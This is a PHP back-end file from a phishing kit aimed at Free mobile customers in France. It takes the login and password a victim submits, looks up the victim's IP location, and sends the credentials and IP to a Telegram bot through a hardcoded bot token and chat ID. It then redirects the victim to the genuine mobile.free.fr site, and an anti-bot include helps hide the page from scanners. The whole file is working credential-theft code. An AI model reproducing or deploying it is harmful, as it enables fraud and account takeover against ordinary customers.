<?php
require_once('../killbot.to.php');

function get_base_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    return $protocol . $host . '/';
}

function asset($relative_path = '') {
    return get_base_url() . ltrim($relative_path, '/');
}


if (isset($_POST['login'])) {
    var_dump($_POST);

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
  $output = NULL;
  if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
      $ip = $_SERVER["REMOTE_ADDR"];
      if ($deep_detect) {
          if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
              $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
              $ip = $_SERVER['HTTP_CLIENT_IP'];
      }
  }
  $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), array(), strtolower(trim($purpose)));
  $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
  $continents = array(
      "AF" => "Africa",
      "AN" => "Antarctica",
      "AS" => "Asia",
      "EU" => "Europe",
      "OC" => "Australia (Oceania)",
      "NA" => "North America",
      "SA" => "South America"
  );
  if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
      $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
      if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
          switch ($purpose) {
              case "location":
                  $output = array(
                      "city"           => @$ipdat->geoplugin_city,
                      "state"          => @$ipdat->geoplugin_regionName,
                      "country"        => @$ipdat->geoplugin_countryName,
                      "country_code"   => @$ipdat->geoplugin_countryCode,
                      "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                      "continent_code" => @$ipdat->geoplugin_continentCode
                  );
                  break;
              case "address":
                  $address = array($ipdat->geoplugin_countryName);
                  if (@strlen($ipdat->geoplugin_regionName) >= 1)
                      $address[] = $ipdat->geoplugin_regionName;
                  if (@strlen($ipdat->geoplugin_city) >= 1)
                      $address[] = $ipdat->geoplugin_city;
                  $output = implode(", ", array_reverse($address));
                  break;
              case "city":
                  $output = @$ipdat->geoplugin_city;
                  break;
              case "state":
                  $output = @$ipdat->geoplugin_regionName;
                  break;
              case "region":
                  $output = @$ipdat->geoplugin_regionName;
                  break;
              case "country":
                  $output = @$ipdat->geoplugin_countryName;
                  break;
              case "countrycode":
                  $output = @$ipdat->geoplugin_countryCode;
                  break;
          }
      }
  }
  return $output;
}


$dat = date( 'd/m/Y h:i:s', time() );
    
   $ip = "";
	// if user from the share internet 
	if(!empty($_SERVER['HTTP_CLIENT_IP'])) { 
		$ip = $_SERVER['HTTP_CLIENT_IP']; 
	} 
	//if user is from the proxy 
	elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
	} 
	//if user is from the remote address 
	else{ 
		$ip = $_SERVER['REMOTE_ADDR']; 
	}	 

 
  if ($ip == "192.168.76.1") {
    $country = ip_info("41.216.235.93", "Location");
  } else {
    $country = ip_info($ip, "Location");
  }




$content = "[🏛️] +1 LOGIN | ETAPE 3 <b> FREE </b>  \n \n <b>[👤] Identifiant: </b>". $_POST['login']."\n <b>[🔑] Mot De Passe  : </b>". $_POST['password'] ." \n  [🌐] IP Client : ". $ip;
$api_key = "7332728557:AAFGPY-Yf-6Exz9R2t8XLROnheIcTdjoJeM";

$api_key2 = "7332728557:AAFGPY-Yf-6Exz9R2t8XLROnheIcTdjoJeM";

$data = [
  'chat_id' => '@Mobile765',
  'text' => $content,
  'parse_mode' => 'HTML'
];



$response = file_get_contents("https://api.telegram.org/bot$api_key2/sendMessage?".http_build_query($data));

if ($response) {
    return header('Location: https://mobile.free.fr/');
}
else {
    return header('Location: '. asset(''));
}

}
else {
    return header('Location: /'. asset(''));
}

